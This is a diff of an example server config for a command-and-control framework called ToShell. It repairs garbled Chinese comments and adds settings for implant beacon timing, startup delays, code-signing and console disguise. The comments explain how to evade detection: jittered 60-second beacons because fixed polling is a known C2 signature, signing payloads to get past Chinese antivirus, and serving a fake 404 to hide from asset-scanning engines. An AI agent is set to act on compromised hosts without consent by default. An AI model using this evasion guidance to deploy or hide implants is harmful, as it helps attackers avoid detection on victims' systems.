@@ -1,21 +1,22 @@
 # =====================================================================
 # ToShell Team Server 配置文件模板（开源示例）
-# 复制�?server.yaml 后按需修改；部署前请务必更改所有敏感项�?
+# 复制为 server.yaml 后按需修改；部署前请务必更改所有敏感项。
 #   Linux/macOS:  cp configs/server.yaml.example configs/server.yaml
 #   Windows:      copy configs\server.yaml.example configs\server.yaml
 # =====================================================================
 
 auth:
-    # 管理员密码：可填 bcrypt 哈希($2a$...)或明文，明文会被自动哈希。默�?toshell，部署后请立即修改�?
+    # 管理员密码：可填 bcrypt 哈希($2a$...)或明文，明文会被自动哈希。默认 toshell，部署后请立即修改。
     admin_password: toshell
     admin_username: admin
     api_key_enabled: true
-    # API Key：调�?API 时用 X-API-Key 请求头传递；务必改为你自己的随机串�?
-    api_keys: change-me-api-key
+    # API Key：调用 API 时用 X-API-Key 请求头传递；务必改为你自己的随机串（可以配多个）。
+    api_keys:
+        - change-me-api-key
     enabled: true
     jwt_enabled: true
     jwt_expire: 24
-    # JWT 签名密钥：留空首次启动会自动生成并写回；也可手动�?32 字节随机串�?
+    # JWT 签名密钥：留空首次启动会自动生成并写回；也可手填 32 字节随机串。
     jwt_key: ""
 
 database:
@@ -29,29 +30,72 @@ database:
     username: ""
 
 implant:
-    interval: 5
-    jitter: 2
+    # 心跳间隔(秒)与抖动(%)：载荷构建不指定时取这里的值。
+    # 5 秒固定轮询是最典型的 C2 行为特征，默认给 60s ± 20%；
+    # 对时效要求高的场景可调小，但建议保持 >= 15s 且抖动 >= 20%。
+    interval: 60
+    jitter: 20
     kill_date: ""
     output_dir: ./implants
     retry_count: 3
     retry_wait: 5
     working_hours: ""
-    # 启动随机延迟（秒）：植入端启动后随机休眠 [min,max] 秒，打乱"启动即行�?检测（0 关闭�?
+    # 启动随机延迟（秒）：植入端启动后随机休眠 [min,max] 秒，打乱"启动即行为"的检测节奏。
+    # 生成载荷时可在页面上覆盖（页面留 0 = 用这里的值；0 不会关闭延迟，想几乎零延迟填 1/1）。
     startup_delay_min: 2
     startup_delay_max: 10
+    # 植入端模板源码目录（生成载荷时现场编译用的源码）。留空 = 按下列顺序自动解析：
+    #   TOSHELL_IMPLANT_TEMPLATE_DIR 环境变量 → exe 同目录 implant/ →
+    #   exe 同目录 internal/server/builder/implant → 当前工作目录 internal/server/builder/implant
+    # 命中条件是该目录内存在 main.go。
+    # 发布包与本地开发都靠"exe 同目录 implant/"命中，所以通常**不需要**设置这一项；
+    # 仅当模板放在别处时才填（可填绝对路径，或相对服务端工作目录的路径）。
+    # 注意：C 植入端模板固定取该目录的**兄弟**目录 implant_c/，两者必须保持同级。
+    # template_dir: ""
 
 builder:
-    # C 植入端（�?50KB）编译所需�?mingw-w64 gcc。留空时自动探测�?
-    # 环境变量 TOSHELL_MINGW_GCC / CC / MINGW_HOME / MSYS2_ROOT / MINGW_PREFIX �?
-    # 服务端同目录便携工具链（�?./mingw64/bin/gcc.exe）→ 常见安装目录
-    # （MSYS2/TDM-GCC/Chocolatey/Scoop）→ PATH �?Windows 注册�?PATH�?
-    # 可填 gcc 可执行文件路径、所在目录，�?PATH 中的命令名�?
+    # C 植入端（约 50KB）编译所需的 mingw-w64 gcc。留空时自动探测：
+    # 环境变量 TOSHELL_MINGW_GCC / CC / MINGW_HOME / MSYS2_ROOT / MINGW_PREFIX →
+    # 服务端同目录便携工具链（如 ./mingw64/bin/gcc.exe）→ 常见安装目录
+    # （MSYS2/TDM-GCC/Chocolatey/Scoop）→ PATH → Windows 注册表 PATH。
+    # 可填 gcc 可执行文件路径、所在目录，或 PATH 中的命令名。
     mingw_gcc_path: ""
+
+    # ── 代码签名（Authenticode，Windows 载荷可选）────────────────────────
+    # 为什么需要：装有 360/电脑管家等国产安全软件的主机上，**未签名的新 PE 往往在
+    # 进程创建阶段就被拒绝执行并删除**（实测连 Hello-World 程序也一样，而微软签名的
+    # notepad.exe 副本可正常执行）。签名不是免杀银弹（杀软还会看信誉与行为），
+    # 但它是"能不能跑起来"这一层的敲门砖。
+    #
+    # 证书二选一（pfx 优先）：
+    #   sign_pfx_path + sign_pfx_password：用证书文件签名（密码通过环境变量传给子进程，
+    #     不会出现在命令行里）；
+    #   sign_thumbprint：用本机证书存储 CurrentUser\My 里该指纹的证书签名（EV/硬件
+    #     令牌场景更标准；有 signtool.exe 时优先用它，否则回退 PowerShell）。
+    # 自签名证书（仅测试；目标机需导入受信任根，签名才会显示 Valid）：
+    #   New-SelfSignedCertificate -Type CodeSigningCert -Subject "CN=YourName" `
+    #     -KeyUsage DigitalSignature -KeySpec Signature `
+    #     -CertStoreLocation Cert:\CurrentUser\My -NotAfter (Get-Date).AddYears(3)
+    #   导出 pfx：$c = Get-ChildItem Cert:\CurrentUser\My\<指纹>; `
+    #     Export-PfxCertificate -Cert $c -FilePath .\codesign.pfx `
+    #     -Password (ConvertTo-SecureString '你的密码' -AsPlainText -Force)
+    sign_enabled: false
+    sign_pfx_path: ""
+    sign_pfx_password: ""
+    sign_thumbprint: ""
+    # 时间戳服务器（可选）：留空则不时间戳；内网/离线环境通常不可达，失败不影响签名本身
+    sign_timestamp_url: ""
+    # signtool.exe 路径（可选）：留空自动探测 PATH 与 Windows SDK 目录
+    sign_signtool_path: ""
+    # 写入签名的描述（可选）
+    sign_description: ""
+    # true：签名失败就丢弃该载荷（构建报错）；false：只告警并返回未签名产物
+    sign_fail_closed: false
 
 listener:
     cert_file: ""
     enabled: true
-    # 植入端加密密钥（AES-256）：留空首次启动自动生成；更换后需重新生成所有植入端�?
+    # 植入端加密密钥（AES-256）：留空首次启动自动生成；更换后需重新生成所有植入端。
     encryption_key: ""
     front_domain: ""
     heartbeat_timeout: 60s
@@ -61,7 +105,7 @@ listener:
     mimicry_site: ""
     port: 8080
     protocol: tcp
-    # 公网地址（服务器公网 IP/域名），生成的植入端连接它�?
+    # 公网地址（服务器公网 IP/域名），生成的植入端连接它。
     public_host: 127.0.0.1
     tls_enabled: false
     write_queue_size: 8192
@@ -92,9 +136,9 @@ server:
     write_timeout: 30s
 
 webhook:
-    # �Զ�ʶ��ƽ̨������/����(open.feishu.cn)/��ҵ΢��(qyapi.weixin.qq.com)/Slack/Discord��
-    # Ҳ����ʽָ�� auto|dingtalk|feishu|wecom|slack|discord|generic��
-    # secret Ϊ�����˼�ǩ��Կ�������� URL ������������ body �� timestamp+sign��
+    # 自动识别平台：钉钉(dingtalk)/飞书(open.feishu.cn)/企业微信(qyapi.weixin.qq.com)/Slack/Discord；
+    # 也可显式指定 auto|dingtalk|feishu|wecom|slack|discord|generic。
+    # secret 为各平台的加签密钥（钉钉走 URL 参数，飞书走 body 内 timestamp+sign）。
     content: "new session online: {hostname} ({username}@{os}/{arch}) from {remote_addr}"
     enabled: false
     format: auto
@@ -104,49 +148,50 @@ webhook:
 
 ai:
     enabled: false
-    # OpenAI 兼容�?chat/completions 端点（如 https://api.deepseek.com/v1�?
+    # OpenAI 兼容的 chat/completions 端点（如 https://api.deepseek.com/v1）。
     base_url: ""
     api_key: ""
     model: deepseek-chat
     timeout: 60
     max_turns: 20
-    # 异步自主 Agent 并发上限（同时进行的任务数，默认 2�?-8）。每个任务后�?goroutine，超出则排队�?
+    # 异步自主 Agent 并发上限（同时进行的任务数，默认 2，范围 1-8）。每个任务起一个 goroutine，超出则排队。
     agent_concurrency: 2
-    # 工具下载域名白名单（远程下载 remote_download 只能从这些域名拉取；�?允许任意公网域名，但始终拒绝内网/回环地址�?SSRF�?
+    # 工具下载域名白名单（远程下载 remote_download 只能从这些域名拉取；留空=允许任意公网域名，
+    # 但始终拒绝内网/回环地址，防 SSRF）。
     download_allowlist: []
-    # 权限模式：auto=全自�?默认,工具直接执行)；normal=影响会话的操�?下发/文件/进程/凭据/截屏/隧道/插件�?
-    # 执行前需用户同意(副驾驶会拦截并请求确�?；任务流(delegate/剧本)除外�?
+    # 权限模式：auto=全自动（默认，工具直接执行）；normal=影响会话的操作（下发/文件/进程/凭据/截屏/隧道/插件）
+    # 执行前需用户同意（副驾驶会拦截并请求确认；任务流(delegate/剧本)除外）。
     consent_mode: auto
 
-# ── Web 控制台防护（防资产测�?/ 防未授权访问）────────────────────────
-# 在控制台与全部管�?API 前加一道认证门槛，阻止 Fofa/Quake/Hunter 等资产测�?
-# 引擎抓取并收录本资产。仅作用于控制台端口；植入端回连 /api/v1/implant/* �?
-# C2 监听器端口完全不受影响，已持�?API Key / JWT 的脚本与 AI 调用照常放行�?
+# ── Web 控制台防护（防资产测绘 / 防未授权访问）────────────────────────
+# 在控制台与全部管理 API 前加一道认证门槛，阻止 Fofa/Quake/Hunter 等资产测绘
+# 引擎抓取并收录本资产。仅作用于控制台端口；植入端回连 /api/v1/implant/* 与
+# C2 监听器端口完全不受影响，已持有 API Key / JWT 的脚本与 AI 调用照常放行。
 web:
-    # 是否启用基础认证。默�?false（不影响升级）；开启前请先填好用户名与密码�?
+    # 是否启用基础认证。默认 false（不影响升级）；开启前请先填好用户名与密码。
     basic_auth_enabled: false
     basic_auth_user: toshell
-    # 密码：保存时自动 bcrypt 哈希（也可直接填 $2a$ 开头的哈希）�?
-    # 建议在「设�?�?安全 �?防资产测绘」里填写，避免明文落在文件里�?
+    # 密码：保存时自动 bcrypt 哈希（也可直接填 $2a$ 开头的哈希）。
+    # 建议在「设置 → 安全 → 防资产测绘」里填写，避免明文落在文件里。
     basic_auth_password: ""
     # 未认证响应方式：
     #   basic    = 401 + WWW-Authenticate（浏览器弹出认证框，前端照常可用，默认）
-    #   disguise = �?404 伪装（不留任�?C2 特征，测绘引擎看�?无此服务"�?
-    # disguise 模式下浏览器不会弹认证框，请配合下面�?stealth_key 或在入口路径输入凭据�?
+    #   disguise = 纯 404 伪装（不留任何 C2 特征，测绘引擎看到"无此服务"）
+    # disguise 模式下浏览器不会弹认证框，请配合下面的 stealth_key 或在入口路径输入凭据。
     unauth_mode: basic
-    # 可选：替换控制台首页标题，避免默认标题暴露用途�?
+    # 可选：替换控制台首页标题，避免默认标题暴露用途。
     decoy_title: ""
     # 可选：控制台来源白名单（CIDR）。非空时仅这些网段可访问，可在公网部署时把控制台
-    # 限制在运维网段（需自行确保不会把自己挡在外面）�?
+    # 限制在运维网段（需自行确保不会把自己挡在外面）。
     allow_cidrs: []
-    # 隐蔽入口密钥（disguise 模式必填，否则浏览器无法进入控制台）�?
-    #   浏览器访�?http://<host>:18081/__gate?k=<stealth_key> 即种下入�?Cookie�?0 天）�?
-    #   之后前端�?API �?Cookie 通行�? 及其他路径对未持凭据者仍�?404�?
-    #   也可直接访问 /__gate，由浏览器弹框输入上面的用户�?密码进入�?
-    #   可在设置页「生成」按钮随机生成（hex，URL 安全）�?
+    # 隐蔽入口密钥（disguise 模式必填，否则浏览器无法进入控制台）：
+    #   浏览器访问 http://<host>:18081/__gate?k=<stealth_key> 即种下入口 Cookie（30 天），
+    #   之后前端与 API 凭 Cookie 通行，/ 及其他路径对未持凭据者仍是 404。
+    #   也可直接访问 /__gate，由浏览器弹框输入上面的用户名/密码进入。
+    #   可在设置页「生成」按钮随机生成（hex，URL 安全）。
     stealth_key: ""
-    # 入口 Cookie 名（一般无需修改）�?
+    # 入口 Cookie 名（一般无需修改）。
     stealth_cookie: tsh_gate
-    # 入口路径 /__gate 是否返回 401 挑战（便于浏览器弹框）。设�?false 则只能用密钥链接进入�?
-    # 线上不会出现任何 401 响应�?
+    # 入口路径 /__gate 是否返回 401 挑战（便于浏览器弹框）。设为 false 则只能用密钥链接进入，
+    # 线上不会出现任何 401 响应。
     entry_challenge: true
